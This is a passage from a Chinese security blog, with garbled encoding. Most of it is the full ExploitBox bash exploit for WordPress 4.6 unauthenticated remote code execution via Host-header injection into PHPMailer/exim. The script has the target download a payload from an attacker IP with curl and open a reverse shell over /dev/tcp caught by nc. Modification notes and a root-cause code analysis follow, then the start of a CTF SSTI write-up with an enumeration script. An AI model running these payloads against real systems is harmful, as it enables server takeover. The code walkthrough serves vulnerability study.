,oOXXXNNNXd;,. # .ddc;,,:c;. ,c: .cxxc:;:ox: # .dxxxxo, ., ,kMMM0:. ., .lxxxxx: # .dxxxxxc lW. oMMMMMMMK d0 .xxxxxx: # .dxxxxxc .0k.,KWMMMWNo :X: .xxxxxx: # .dxxxxxc .xN0xxxxxxxkXK, .xxxxxx: # .dxxxxxc lddOMMMMWd0MMMMKddd. .xxxxxx: # .dxxxxxc .cNMMMN.oMMMMx' .xxxxxx: # .dxxxxxc lKo;dNMN.oMM0;:Ok. 'xxxxxx: # .dxxxxxc ;Mc .lx.:o, Kl 'xxxxxx: # .dxxxxxdl;. ., .. .;cdxxxxxx: # .dxxxxxxxxxdc,. 'cdkkxxxxxxxx: # .':oxxxxxxxxxdl;. .;lxkkkkkxxxxdc,. # .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:. # .':oxxxxxxxxx.ckkkkkkkkxl,. # .,cdxxxxx.ckkkkkxc. # .':odx.ckxl,. # .,.'. # # https://ExploitBox.io # # https://twitter.com/Exploit_Box # # ----------------------------------------------------------------- rev_host=\"124.220.233.26\" function prep_host_header() { cmd=\"$1\" rce_cmd=\"\\${run{$cmd}}\"; # replace / with ${substr{0}{1}{$spool_directory}} #sed 's^/^${substr{0}{1}{$spool_directory}}^g' rce_cmd=\"`echo $rce_cmd | sed 's^/^\\${substr{0}{1}{\\$spool_directory}}^g'`\" # replace ' ' (space) with #sed 's^ ^${substr{10}{1}{$tod_log}}$^g' rce_cmd=\"`echo $rce_cmd | sed 's^ ^\\${substr{10}{1}{\\$tod_log}}^g'`\" #return \"target(any -froot@localhost -be $rce_cmd null)\" host_header=\"target(any -froot@localhost -be $rce_cmd null)\" return 0 } #cat exploitbox.ans intro=\" DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09r bzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19f G1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19c G1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAg IHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19f IC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19f X19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6 b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtb NUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01N TU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1 QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTsz NG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20g G1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54 eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcb WzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2RO TU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMg ICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2Qxtb MTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZD G1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQob WzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1sz NG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtb MzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19f X19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4 bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K\" intro2=\" ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09 fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtb MG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBE aXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09 fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAg ICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdh bGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBt ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBt ChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJp bGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1 cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg==\" echo \"$intro\" | base64 -d echo \"$intro2\" | base64 -d if [ \"$#\" -ne 1 ]; then echo -e \"Usage: $0 target-wordpress-url \" exit 1 fi target=\"$1\" echo -ne \"\\e[91m[*]\\033[0m\" read -p \" Sure you want to get a shell on the target '$target' ? [y/N] \" choice echo if [ \"$choice\" == \"y\" ]; then echo -e \"\\e[92m[*]\\033[0m Guess I can't argue with that... Let's get started... \" echo -e \"\\e[92m[+]\\033[0m Connected to the target\" # Serve payload/bash script on :80 RCE_exec_cmd=\"(sleep 3s &amp;&amp; nohup bash -i &gt;/dev/tcp/$rev_host/5555 0&lt;&amp;1 2&gt;&amp;1) &amp;\" echo \"$RCE_exec_cmd\" &gt; rce.txt python -mSimpleHTTPServer 80 2&gt;/dev/null &gt;&amp;2 &amp; hpid=$! # Save payload on the target in /tmp/rce cmd=\"/usr/bin/curl -o/tmp/rce $rev_host/rce.txt\" prep_host_header \"$cmd\" curl -H\"Host: $host_header\" -s -d 'user_login=@1_h bcx&amp;wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword echo -e \" \\e[92m[+]\\e[0m Payload sent successfully\" # Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce cmd=\"/bin/bash /tmp/rce\" prep_host_header \"$cmd\" curl -H\"Host: $host_header\" -d 'user_login=@1_h bcx&amp;wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword &amp; echo -e \" \\e[92m[+]\\033[0m Payload executed!\" echo -e \" \\e[92m[*]\\033[0m Waiting for the target to send us a \\e[94mreverse shell\\e[0m... \" nc -nvv -l -p 5555 echo else echo -e \"\\e[92m[+]\\033[0m Responsible choice ;) Exiting. \" exit 0 fi echo \"Exiting...\" exit 0 è„šæœ¬éœ€è¦ä¿®æ”¹çš„éƒ¨åˆ† ä¸‰ä¸ªåœ°æ–¹ ç¬¬ä¸€å¤„ #1 line 1 rev_host=\"192.168.57.1\" #1 è¿™è¾¹è¦æ›¿æ¢æˆä½ çš„æ”»å‡»æœºçš„ipåœ°å€ï¼Œä¸€èˆ¬æ˜¯å’Œé¶æœºå¤„åœ¨ä¸€ä¸ªå±€åŸŸç½‘å†…çš„ï¼Œå¯ä»¥æå‰è®¿é—®ä¸‹wordpressçš„ç½‘ç«™è¿›è¡Œæµ‹è¯•ã€‚ ç¬¬äºŒå¤„ #2 line 75 ç¬¬ä¸‰å¤„ #3 line 80 curl -H\"Host: $host_header\" -s -d 'user_login=admin&amp;wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword #2 echo -e \" \\e[92m[+]\\e[0m Payload sent successfully\" # Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce cmd=\"/bin/bash /tmp/rce\" prep_host_header \"$cmd\" curl -H\"Host: $host_header\" -d 'user_login=admin&amp;wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword &amp; #3 è¿™ä¸¤ä¸ªåœ°æ–¹ä¸»è¦è¦ä¿®æ”¹çš„å¯èƒ½æ˜¯user_login=adminè¿™ä¸ªå‚æ•°ï¼Œè¿™ä¸ªpocé‡Œé»˜è®¤çš„æ˜¯admin è¿™é‡Œå…¶å®å°±æ˜¯ä½ è£…wordpressæ—¶ç®¡ç†å‘˜çš„æˆ–è€…ä»»æ„ä¸€ä¸ªç”¨æˆ·çš„é‚®ç®± å› ä¸ºæ‰¾å›å¯†ç æ—¶ä»–ä¼šå…ˆåˆ¤æ–­é‚®ç®±æ˜¯å¦å­˜åœ¨ï¼Œå†è¿›è¡Œä¸‹ä¸€æ­¥ å¦‚æœè¿™é‡Œé‚®ç®±ä¸å­˜åœ¨ ä½ å‘åŒ…æ˜¯è¿”å›200 å‘Šè¯‰ä½ é‚®ç®±ä¸å­˜åœ¨ å¦‚æœæ˜¯å­˜åœ¨æœ‰çš„é‚®ç®±ï¼Œå°±æ˜¯è¿”å›302è·³è½¬åˆ°è¾“å…¥é‚®ç®±å¯†ç çš„ç•Œé¢ åŒæ—¶å‘Šè¯‰ä½ é‚®ä»¶å·²ç»å‘äº† ä¸‹é¢æ˜¯burpæ¨¡æ‹Ÿæ”»å‡»æ—¶å€™çš„æŠ“åŒ… è¿”å›çš„æ˜¯302æ—¶è¯´æ˜å·²ç»å‘½ä»¤æ‰§è¡ŒæˆåŠŸ ![image-20230829164046765](WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)/image-20230829164046765.png) å¯ä»¥çœ‹åˆ°é¶æœºä¸Šä¹Ÿç¡®å®å‡ºç°äº†rceæ–‡ä»¶ è¿™è¾¹æ‰§è¡Œçš„å‘½ä»¤æ˜¯/usr/bin/wget --output-document /tmp/rce 124.220.233.26/a.txt ![image-20230829164134260](WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)/image-20230829164134260.png) è¿™ä¸‰ä¸ªåœ°æ–¹æ”¹å¥½äº†ä¹‹åï¼Œè„šæœ¬å°±å¯ä»¥è¿è¡Œäº† è„šæœ¬çš„ä¸»è¦æµç¨‹ï¼š ç”Ÿæˆæœ¬åœ°rce.txt é‡Œé¢å†™çš„æ˜¯æ˜¯å»ºç«‹è¿æ¥çš„å‘½ä»¤ å‘½ä»¤æ‰§è¡Œç¬¬ä¸€æ¬¡ curlæ”»å‡»æœºè·å–rce.txt å†™åˆ°/tmpç›®å½•ä¸‹ å‘½ä»¤æ‰§è¡Œç¬¬äºŒæ¬¡ è¿è¡Œtmpç›®å½•ä¸‹çš„rce ncè¿æ¥é¶æœº 0x06 æ¼æ´åŸç†æ·±å…¥ å°†dockerä¸­çš„wordpressæºç æ‹·è´å‡ºæ¥sudo docker cp pwnscriptum_web_1:/var/www/html /home/jgc/code æ ¹æ®å¿˜è®°å¯†ç é¡µé¢çš„urlwp-login.php?action=lostpasswordå®šä½åˆ°wp-login.phpçš„retrieve_passwordå‡½æ•°ï¼Œæ­¤å‡½æ•°æ˜¯å¯¹å¯†ç çš„æ“ä½œå‡½æ•°ã€‚ æ­¤å‡½æ•°ä¸­å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå¤„ç†åï¼Œæœ€åé€šè¿‡ä»¥ä¸‹ä»£ç å‘é€é‚®ä»¶ function retrieve_password() { ...... $message = apply_filters( 'retrieve_password_message', $message, $key, $user_login, $user_data ); if ( $message &amp;&amp; !wp_mail( $user_email, wp_specialchars_decode( $title ), $message ) ) wp_die( __('The email could not be sent.') . \"&lt;br /&gt; \" . __('Possible reason: your host may have disabled the mail() function.') ); return true; } è·Ÿè¿›wp_mailå‡½æ•°ï¼Œå®šä½åˆ°/wp-includes/pluggable.php å‡½æ•°ä¸­å…¶ä¸­å…³äºhostçš„è®¾ç½®å¦‚ä¸‹ if ( !isset( $from_name ) ) $from_name = 'WordPress'; if ( !isset( $from_email ) ) { // Get the site domain and get rid of www. $sitename = strtolower( $_SERVER['SERVER_NAME'] ); if ( substr( $sitename, 0, 4 ) == 'www.' ) { $sitename = substr( $sitename, 4 ); } $from_email = 'wordpress@' . $sitename; } $from_email = apply_filters( 'wp_mail_from', $from_email ); $from_name = apply_filters( 'wp_mail_from_name', $from_name ); $phpmailer-&gt;setFrom( $from_email, $from_name ); æ ¹æ®ä»£ç å¯ä»¥çœ‹å‡ºwordpressåŸºäº$_SERVER['SERVER_NAME']æ¥æ„é€ $from_emailå‘é€é‚®ä»¶çš„åŸŸï¼Œå‰é¢æ‹¼æ¥ä¸Šwordpress@ $_SERVER['SERVER_NAME']å‚æ•°æ˜¯é€šè¿‡è¯·æ±‚å¤´Hostå­—æ®µä¼ å…¥ï¼Œå¹¶ä¸”è¿™é‡Œåªæ˜¯ç®€å•çš„ä½¿ç”¨substrå»æ‰äº†å‰é¢çš„www.ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤æªæ–½ã€‚ åœ¨dockerä¸­æ·»åŠ a.phpä»£ç æ¥æŸ¥çœ‹$_SERVER['SERVER_NAME']çš„å€¼ &lt;?php if (isset($_SERVER['SERVER_NAME'])){ echo $_SERVER['SERVER_NAME']; }else{ echo \"no value\"; } ?&gt; åœ¨ä¸‹å›¾ä¸­çœ‹åˆ°å°±æ˜¯Hostå­—æ®µçš„å€¼ ![image-20230829160821813](WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)/image-20230829160821813.png) æ¥ç€è·Ÿè¿›setFromå‡½æ•°ï¼Œå®šä½åˆ°wp-includes/class-phpmailer.phpï¼Œå‘ç°å…¶ç”¨åˆ°äº†PHPMailerç»„ä»¶ setFromå‡½æ•°å¦‚ä¸‹ï¼Œè¿™ä¸ªå‡½æ•°å¯¹æ•°æ®è¿›è¡Œæ ¡éªŒï¼Œæ²¡é—®é¢˜çš„è¯è®¾ç½®Senderå˜é‡ä¸ºaddresså˜é‡çš„å€¼ public function setFrom($address, $name = '', $auto = true) { $address = trim($address); $name = trim(preg_replace('/[\\r ]+/', '', $name)); //Strip breaks and trim // Don't validate now addresses with IDN. Will be done in send(). if (($pos = strrpos($address, '@')) === false or (!$this-&gt;has8bitChars(substr($address, ++$pos)) or !$this-&gt;idnSupported()) and !$this-&gt;validateAddress($address)) { $error_message = $this-&gt;lang('invalid_address') . $address; $this-&gt;setError($error_message); $this-&gt;edebug($error_message); if ($this-&gt;exceptions) { throw new phpmailerException($error_message); } return false; } $this-&gt;From = $address; $this-&gt;FromName = $name; if ($auto) { if (empty($this-&gt;Sender)) { $this-&gt;Sender = $address; } } return true; } å…¶ä¸­validateAddress()å‡½æ•°åœ¨åŒæ–‡ä»¶ä¸‹ï¼Œå‡½æ•°å‰åŠéƒ¨åˆ†å¦‚ä¸‹ if (!$patternselect or $patternselect == 'auto') { //Check this constant first so it works when extension_loaded() is disabled by safe mode //Constant was added in PHP 5.2.4 if (defined('PCRE_VERSION')) { //This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2 if (version_compare(PCRE_VERSION, '8.0.3') &gt;= 0) { $patternselect = 'pcre8'; } else { $patternselect = 'pcre'; } } elseif (function_exists('extension_loaded') and extension_loaded('pcre')) { //Fall back to older PCRE $patternselect = 'pcre'; } else { //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension if (version_compare(PHP_VERSION, '5.2.0') &gt;= 0) { $patternselect = 'php'; } else { $patternselect = 'noregex'; } } } ç»è¿‡æµ‹è¯•å‘ç°$patternselectå˜é‡è¢«è®¾ç½®ä¸ºpcre8ï¼Œå› æ­¤åœ¨å‡½æ•°åé¢æ‰§è¡Œå¦‚ä¸‹ä»£ç ä¸­çš„pcre8çš„case switch ($patternselect) { case 'pcre8': ... case 'pcre': ... case 'html5': ... case 'noregex': ... case 'php': default: ... } pcre8çš„ä»£ç æ³¨é‡Š Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains. åŸºäºphpå†…ç½®çš„é‚®ç®±éªŒè¯çš„åŸºç¡€ä¸Šåšçš„ä¿®æ”¹ php Use PHP built-in FILTER_VALIDATE_EMAIL; æŸ¥é˜…phpå®˜ç½‘ ![image-20221115091819538.png](WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)/1668523449643126528.png) è¿™ä¸ªéªŒè¯æ–¹å¼å…è®¸ä½¿ç”¨æ‹¬å·æˆ–åŒå¼•å·ä½¿é‚®ç®±åœ°å€åŒ…å«ç©ºæ ¼ï¼Œå› æ­¤åœ¨Hostså­—æ®µæ„é€ çš„å‘ä»¶äººçš„é‚®ç®±å¯ä»¥æ˜¯ target(any -froot@localhost -be ${run{$payload}} null)@qq.com ç»è¿‡éªŒè¯å’Œè¿‡æ»¤ä¹‹åçš„å‡½æ•°è°ƒç”¨ $phpmailer =&gt;Send() wp-includes/pluggable.php#471 =&gt;postSend() wp-includes/class-phpmailer.php#1125 =&gt;mailSend()\twp-includes/class-phpmailer.php#1247 =&gt;mailPassthru()\twp-includes/class-phpmailer.php#1368 å°†payloadä¼ å…¥åˆ°mailPassthru()å‡½æ•°ä¸­ï¼Œå‡½æ•°ä»£ç å¦‚ä¸‹ private function mailPassthru($to, $subject, $body, $header, $params) { //Check overloading of mail function to avoid double-encoding if (ini_get('mbstring.func_overload') &amp; 1) { $subject = $this-&gt;secureHeader($subject); } else { $subject = $this-&gt;encodeHeader($this-&gt;secureHeader($subject)); } if (ini_get('safe_mode') || !($this-&gt;UseSendmailOptions)) { $result = @mail($to, $subject, $body, $header); } else { $result = @mail($to, $subject, $body, $header, $params); } return $result; } ç”±äºæ²¡æœ‰å¼€å¯å®‰å…¨æ¨¡å¼ï¼Œå› æ­¤è°ƒç”¨çš„æ˜¯$result = @mail($to, $subject, $body, $header, $params); @mailæ˜¯è°ƒç”¨åŸç”Ÿçš„mail()ï¼Œåœ¨/wp-includes/class-phpmailer.phpä¸­å®šä¹‰ /** * Which method to use to send mail. * Options: \"mail\", \"sendmail\", or \"smtp\". * @var string */ public $Mailer = 'mail'; /** * The path to the sendmail program. * @var string */ public $Sendmail = '/usr/sbin/sendmail'; æŸ¥é˜…phpæ‰‹å†Œ mail( string $to, string $subject, string $message, array|string $additional_headers = [], string $additional_params = \"\" ): bool å¯¹ç¬¬äº”ä¸ªå‚æ•°æœ‰å¦‚ä¸‹æè¿° The additional_params parameter can be used to pass additional flags as command line options to the program configured to be used when sending mail, as defined by the sendmail_path configuration setting. For example, this can be used to set the envelope sender address when using sendmail with the -f sendmail option. This parameter is escaped by escapeshellcmd() internally to prevent command execution. escapeshellcmd() prevents command execution, but allows to add additional parameters. For security reasons, it is recommended for the user to sanitize this parameter to avoid adding unwanted parameters to the shell command. â€˜additional_paramsâ€™å‚æ•°å¯ç”¨äºå°†é™„åŠ æ ‡å¿—ä½œä¸ºå‘½ä»¤è¡Œé€‰é¡¹ä¼ é€’ç»™é…ç½®ä¸ºåœ¨å‘é€é‚®ä»¶æ—¶ä½¿ç”¨çš„ç¨‹åºï¼Œå¦‚â€™ sendmail_path â€˜é…ç½®è®¾ç½®æ‰€å®šä¹‰çš„é‚£æ ·ã€‚ä¾‹å¦‚ï¼Œå½“ä½¿ç”¨å¸¦æœ‰â€™-fâ€™ sendmailé€‰é¡¹çš„sendmailæ—¶ï¼Œå¯ä»¥ä½¿ç”¨å®ƒæ¥è®¾ç½®ä¿¡å°å‘é€è€…åœ°å€ã€‚ è¯¥å‚æ•°é€šè¿‡escapeshellcmd()åœ¨å†…éƒ¨è½¬ä¹‰ï¼Œä»¥é˜²æ­¢å‘½ä»¤æ‰§è¡Œã€‚escapeshellcmd()é˜»æ­¢å‘½ä»¤çš„æ‰§è¡Œï¼Œä½†æ˜¯å…è®¸æ·»åŠ é¢å¤–çš„å‚æ•°ã€‚å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œå»ºè®®ç”¨æˆ·å¯¹è¯¥å‚æ•°è¿›è¡Œæ¶ˆæ¯’ï¼Œä»¥é¿å…å‘shellå‘½ä»¤æ·»åŠ ä¸å¿…è¦çš„å‚æ•°ã€‚ å®é™…ä¸Šphpmailerç»„ä»¶æ˜¯è°ƒç”¨linuxç³»ç»Ÿå‘½ä»¤sendmailè¿›è¡Œé‚®ä»¶å‘é€ï¼Œå‘½ä»¤æ ¼å¼ä¸ºï¼šsendmail -t -i -fusername@hostname mail() æ‰§è¡Œåï¼Œä¼šæ‰§è¡Œè¿™æ ·çš„æŒ‡ä»¤ sendmail -t -i -fwordpress@è¿‡æ»¤åçš„æ•°æ®åŒ…å¤´ä¸­çš„Hostå­—æ®µå€¼ å¦å¤–sendmailç¬¦å·é“¾æ¥åˆ°exim4ï¼Œexim4çš„-beå‚æ•°èƒ½å¼€å¯å­—ç¬¦ä¸²æ‰©å±•æµ‹è¯•æ¨¡å¼ï¼Œå…è®¸æå–ä¸€äº›å˜é‡æ•°æ® $tod_logè¿”å›ç³»ç»Ÿæ—¶é—´ï¼Œ$spool_directoryè¿”å›è·¯å¾„å€¼/var/spool/exim4ï¼Œå› æ­¤å¯ä»¥ç”¨${substr{10}{1}{$tod_log}}ä»£æ›¿ç©ºæ ¼ã€${substr{0}{1}{$spool_directory}}ä»£æ›¿æ–œæ æ¥ç»•è¿‡-beåé¢å‚æ•°ä¸­ç©ºæ ¼å’Œæ–œæ ï¼Œä»¥åŠrunå¯ä»¥è¿è¡Œç¨‹åº å› æ­¤ä¸Šé¢æåˆ°çš„payload å› æ­¤ä¸Šé¢æåˆ°çš„payload target(any -froot@localhost -be ${run{$payload}} null) æœ€åå˜æˆ sendmail -t -i -fwordpress@target(any -froot@localhost -be ${run{$payload}} null) è¿™æ ·å°±å¯ä»¥æ‰§è¡Œrunä¸­çš„å‘½ä»¤ å¦‚æœç›´æ¥åœ¨å‘½ä»¤è¡Œé‡Œä½¿ç”¨ï¼Œéœ€è¦ç»™runåŠ å¼•å· ![image-20230829161640747](WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)/image-20230829161640747.png) 0x07 å‚è€ƒæ–‡ç«  wordpress 4.6ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆPwnScriptumï¼‰å¤ç° WordPress &lt;= 4.6 å‘½ä»¤æ‰§è¡Œæ¼æ´(PHPMailer)(CVE-2016-10033)å¤ç°åˆ†æ [WordPress 4.6 ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ (PwnScriptum)](https://wuxiuo.com/archives/83) æ·±å…¥åˆ†æWordPress4.6(PHPMailer)å‘½ä»¤æ‰§è¡Œæ¼æ´(CVE-2016-10033) Wordpress 4.6 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆPwnScriptumï¼‰","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"æ”»é˜²ä¸–ç•Œ-easy_web","path":"/2023/08/24/easy-web/","content":"é¢˜ç›®æè¿°ï¼š easy_web é¢˜ç›®è§£é¢˜ï¼š æ‰“å¼€åå¦‚ä¸‹ï¼Œdirsearchæ‰«ç›®å½•æ²¡å•¥æ•ˆæœï¼Œæºä»£ç ä¹Ÿæ²¡ç”¨ï¼Œä¹‹åçœ‹äº†çœ‹è¯¥é¡¹ç›®çš„cmsä¿¡æ¯ é‚£åŸºæœ¬å¯ä»¥æ˜¯sstiäº†ï¼Œä¸è¿‡å°è¯•çš„æ—¶å€™è¿‡æ»¤äº†{}ï¼Œç„¶åæˆ‘å°±ä¸çŸ¥é“å¦‚ä½•å…¥æ‰‹äº†ã€‚ã€‚ã€‚åªèƒ½è·Ÿç€wpèµ°ï¼š å›å½’åˆ°é¦–é¡µå‘ç° å­—ç¬¦è§„èŒƒå™¨ï¼Œæ˜¯ä¸æ˜¯æ‰¾ä¸€äº›ç‰¹æ®Šå­—ç¬¦å¯ä»¥æ¢å¤æˆ{è¿™ç§å½¢å¼ï¼Œå°±æ‰¾ä¸€ä¸‹è·Ÿ{ç±»ä¼¼çš„ç‰¹æ®Šç¬¦å·è¯•ä¸€ä¸‹ ç‰¹æ®Šå­—ç¬¦ç½‘å€ï¼šhttp://www.fhdq.net/ å¯ä»¥æ›¿æ¢æˆåŠŸ ï¸·ï¸·configï¸¸ï¸¸ åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°å•å¼•å·ä¹Ÿè¢«è¿‡æ»¤æ‰ï¼Œï¼‡è¿™ä¸ªç¬¦å·å¯ä»¥è½¬æ¢å‡º' ï¸·ï¸·().__class__.__bases__[0].__subclasses__()ï¸¸ï¸¸ ï¸·ï¸·().__class__.__base__.__subclasses__()ï¸¸ï¸¸è¿”å›ä¸€å¤§å †ï¼Œæœ‰äººå¯èƒ½ä¸çŸ¥é“æ¥ä¸‹æ¥è¦å¹²ä»€ä¹ˆï¼Œè¿™é‡Œçœ‹äº†å¤§ä½¬çš„åˆ†æ,æ·±æœ‰æ„Ÿè§¦ï¼Œè¿™é‡Œè¿”å›çš„å­ç±»ï¼Œæ¥ä¸‹æ¥è¦å»è®¿é—®å…·ä½“æŸä¸€ä¸ªå­ç±»çš„initæ–¹æ³•ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆè¦è®¿é—®initæ–¹æ³•å‘¢ï¼Œå› ä¸ºè®¿é—®åˆ°initæ–¹æ³•ä¹‹åï¼Œä½ å¯ä»¥çŸ¥é“è¿™ä¸ªç±»æ˜¯å¦è¢«é‡å†™äº†ï¼Œå¦‚æœæ²¡æœ‰é‡å†™ï¼Œä¼šè¿”å›objecså­—æ ·ï¼Œå¦‚å›¾ ç±»æ²¡æœ‰è¢«é‡å†™ï¼Œæ˜¯ç»§æ‰¿çš„objectç±»,è¿™äº›ç±»ä¸å…·å¤‡openæ–¹æ³•æ¥æ“ä½œæ–‡ä»¶ï¼Œè¾¾ä¸åˆ°æˆ‘ä»¬ç›®çš„ï¼Œæˆ‘ä»¬å°±æ˜¯è¦é€šè¿‡openæ¥è¯»å–flagæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å»ä¸€ä¸ªä¸€ä¸ªçœ‹ï¼Œæ‰¾åˆ°é‡å†™çš„å­ç±»ï¼Œæ¥é€šè¿‡è°ƒç”¨openæ–¹æ³•è¯»å–æ–‡ä»¶ï¼Œå½“ç„¶è¿™ä¹ˆå¤šå­ç±»ä¸å¯èƒ½ä¸€ä¸ªä¸€ä¸ªæ‰‹åŠ¨å»è¯•ï¼Œäºæ˜¯å†™äº†è„šæœ¬ï¼Œè¿™é‡Œå»burpçˆ†ç ´ä¹Ÿå¯ï¼Œæ¯”è¾ƒæ–¹ä¾¿ import html import re import requests url = 'http://61.147.171.105:55725' for i in range(1, 200): data = { 'str': 'ï¸·ï¸·().__class__.__base__.__subclasses__()[%d].__init__ï¸¸ï¸¸' % i, } res = requests.post(url=url, data=data) res_ = html.unescape(res.text) print(res_) â€‹ è¿™éƒ¨åˆ†ä¼šçœ‹åˆ°æ‰€æœ‰çš„å­ç±»çš„initæ–¹æ³•ï¼Œæ¥ä¸‹æ¥åŠ ä¸ªåˆ¤æ–­è¿‡æ»¤ä¸€ä¸‹å°±OKï¼Œæˆ‘ä»¬æ¥ç€æ³¨å…¥ï¼Œè¿™é‡Œæˆ‘ä»¬çŸ¥é“é‡å†™äº†initæ–¹æ³•çš„å­ç±»åï¼Œé€šè¿‡.__globals__è®¿é—®å®šä¹‰è¯¥ç±»çš„æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´ï¼Œ â€‹ è§£é‡Šä¸‹ä»€ä¹ˆå«å…¨å±€å‘½åç©ºé—´ï¼Œåœ¨ Python 